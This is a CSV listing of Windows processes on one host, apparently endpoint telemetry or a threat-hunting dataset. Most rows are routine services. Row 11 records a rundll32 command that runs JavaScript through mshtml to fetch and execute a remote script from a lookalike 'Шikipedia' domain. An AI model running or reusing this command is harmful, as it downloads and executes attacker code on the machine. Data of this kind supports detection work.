,arguments,hostname,name,path,pid,username
0,"""C:\Program Files\Common Files\McAfee\CSP\3.0.127.0\\McCSPServiceHost.exe""",0007PKYEB,McCSPServiceHost.exe,C:\Program Files\Common Files\McAfee\CSP\3.0.127.0,3281,kyl.san67
1,c:\windows\system32\svchost.exe -k localservice -p -s CDPSvc,0007PKYEB,svchost.exe,c:\windows\system32,1276,NT AUTHORITY\SYSTEM
2,,0007PKYEB,SgrmBroker.exe,,480,NT AUTHORITY\SYSTEM
3,c:\windows\system32\svchost.exe -k localservice -p -s bthserv,0007PKYEB,svchost.exe,c:\windows\system32,2868,NT AUTHORITY\SYSTEM
4,c:\windows\system32\svchost.exe -k localservicenetworkrestricted -p -s Dhcp,0007PKYEB,svchost.exe,c:\windows\system32,3484,NT AUTHORITY\SYSTEM
5,c:\windows\system32\svchost.exe -k netsvcs -p -s iphlpsvc,0007PKYEB,svchost.exe,c:\windows\system32,316,NT AUTHORITY\SYSTEM
6,c:\windows\system32\svchost.exe -k localsystemnetworkrestricted -p -s DeviceAssociationService,0007PKYEB,svchost.exe,c:\windows\system32,3832,NT AUTHORITY\SYSTEM
7,c:\windows\system32\svchost.exe -k localservicenetworkrestricted -p -s wscsvc,0007PKYEB,svchost.exe,c:\windows\system32,2256,NT AUTHORITY\SYSTEM
8,c:\windows\system32\svchost.exe -k localservice -p -s WebClient,0007PKYEB,svchost.exe,c:\windows\system32,5116,NT AUTHORITY\SYSTEM
9,c:\windows\system32\svchost.exe -k netsvcs -p -s BITS,0007PKYEB,svchost.exe,c:\windows\system32,6496,NT AUTHORITY\SYSTEM
10,c:\windows\system32\svchost.exe -k networkservice -p -s NlaSvc,0007PKYEB,svchost.exe,c:\windows\system32,3076,NT AUTHORITY\SYSTEM
11,"C:\Windows\System32\rundll32.exe javascript:""\..\mshtml,RunHTMLApplication "";document.write();GetObject(""script:\http://www.Шikipedia.com/drprov.js'"").Exec();""",0007PKYEB,rundll32.exe,C:\Windows\System32\rundll32.exe,588,zarbake19
12,"""C:\Program Files\WindowsApps\Microsoft.MicrosoftStickyNotes_3.0.119.0_x64__8wekyb3d8bbwe\Microsoft.Notes.exe"" -ServerName:App.AppX495fygk72hjw82j58ny5h3nr8hpsd8vs.mca",0007PKYEB,Microsoft.Notes.exe,C:\Program Files\WindowsApps\Microsoft.MicrosoftStickyNotes_3.0.119.0_x64__8wekyb3d8bbwe,5082,ryamorr
13,,0007PKYEB,SecurityHealthService.exe,,5316,NT AUTHORITY\SYSTEM
14,"""C:\Program Files\Common Files\McAfee\MMSSHost\MMSSHOST.EXE"" MMSCOM homenetsvc",0007PKYEB,MMSSHOST.EXE,C:\Program Files\Common Files\McAfee\MMSSHost,5281,kyl.san67
15,,0007PKYEB,svchost.exe,,4088,NT AUTHORITY\SYSTEM
16,c:\windows\system32\svchost.exe -k networkservice -p -s Dnscache,0007PKYEB,svchost.exe,c:\windows\system32,416,NT AUTHORITY\SYSTEM
17,c:\windows\system32\svchost.exe -k netsvcs -p -s LanmanServer,0007PKYEB,svchost.exe,c:\windows\system32,4132,NT AUTHORITY\SYSTEM
18,c:\windows\system32\svchost.exe -k netsvcs -p -s Winmgmt,0007PKYEB,svchost.exe,c:\windows\system32,5956,NT AUTHORITY\SYSTEM
19,c:\windows\system32\svchost.exe -k localservicenetworkrestricted -p -s WinHttpAutoProxySvc,0007PKYEB,svchost.exe,c:\windows\system32,2320,NT AUTHORITY\SYSTEM
20,"""fontdrvhost.exe""",0007PKYEB,fontdrvhost.exe,C:\Windows\system32,2692,NT AUTHORITY\SYSTEM
